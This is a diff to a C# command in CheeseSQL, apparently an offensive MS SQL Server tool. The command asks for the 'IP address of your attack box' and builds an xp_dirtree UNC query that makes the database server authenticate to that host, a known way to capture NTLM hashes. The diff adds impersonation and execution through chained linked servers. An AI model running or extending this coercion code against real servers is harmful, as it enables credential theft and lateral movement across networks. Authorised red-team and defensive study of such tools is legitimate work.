@@ -27,41 +27,34 @@ namespace CheeseSQL.Commands
             string database = "";
             string connectserver = "";
             string ip = "";
-            bool sqlauth = false;
             string target = "";
+            string intermediate = "";
+            
+            string impersonate = "";
+            string impersonate_intermediate = "";
+            string impersonate_linked = "";
 
-            if (arguments.ContainsKey("/sqlauth"))
-            {
-                sqlauth = true;
-            }
-            if (arguments.ContainsKey("/db"))
-            {
-                database = arguments["/db"];
-            }
-            if (arguments.ContainsKey("/server"))
-            {
-                connectserver = arguments["/server"];
-            }
-            if (arguments.ContainsKey("/ip"))
-            {
-                ip = arguments["/ip"];
-            }
-            if (arguments.ContainsKey("/target"))
-            {
-                target = arguments["/target"];
-            }
 
-            if (String.IsNullOrEmpty(database))
+            bool sqlauth = arguments.ContainsKey("/sqlauth");
+
+            arguments.TryGetValue("/impersonate", out impersonate);
+            arguments.TryGetValue("/intermediate", out intermediate);
+            arguments.TryGetValue("/target", out target);
+            arguments.TryGetValue("/impersonate-intermediate", out impersonate_intermediate);
+            arguments.TryGetValue("/impersonate-linked", out impersonate_linked);
+
+            if (!arguments.TryGetValue("/db", out database))
             {
                 Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                 return;
             }
-            if (String.IsNullOrEmpty(connectserver))
+            if (!arguments.TryGetValue("/server", out connectserver))
             {
                 Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                 return;
             }
-            if (String.IsNullOrEmpty(ip))
+
+            if (!arguments.TryGetValue("/ip", out ip))
             {
                 Console.WriteLine("\r\n[X] You must supply the IP address of your attack box!\r\n");
                 return;
@@ -80,9 +73,14 @@ namespace CheeseSQL.Commands
 
 
             string queryUNC = $"EXEC master..xp_dirtree \"\\\\{ip}\\\\test\";";
-            if (!String.IsNullOrEmpty(target))
+            if (!String.IsNullOrEmpty(target) && !String.IsNullOrEmpty(intermediate))
             {
-                SQLExecutor.ExecuteLinkedProcedure(connection, queryUNC, target, null, null);
+                SQLExecutor.ExecuteDoubleLinkedProcedure(connection, queryUNC, target, intermediate, impersonate, impersonate_linked, impersonate_intermediate);
+
+            }
+            else if (!String.IsNullOrEmpty(target))
+            {
+                SQLExecutor.ExecuteLinkedProcedure(connection, queryUNC, target, impersonate, impersonate_linked);
             }
             SQLExecutor.ExecuteProcedure(connection, queryUNC);
 
